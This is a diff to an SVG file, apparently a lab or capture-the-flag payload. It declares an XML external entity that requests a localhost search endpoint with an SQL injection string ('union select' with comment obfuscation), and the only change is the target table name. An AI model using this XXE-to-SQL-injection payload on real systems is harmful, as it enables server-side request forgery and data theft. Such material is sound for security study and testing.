@@ -1,5 +1,5 @@
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "http://localhost:8001/search?q='union/**/select/**/*/**/from/**/_cdac4a84a737d9d1--">
+  <!ENTITY xxe SYSTEM "http://localhost:8001/search?q='union/**/select/**/*/**/from/**/_0dab7bad101846f6--">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
   <text font-size="14" x="10" y="20">&xxe;</text>
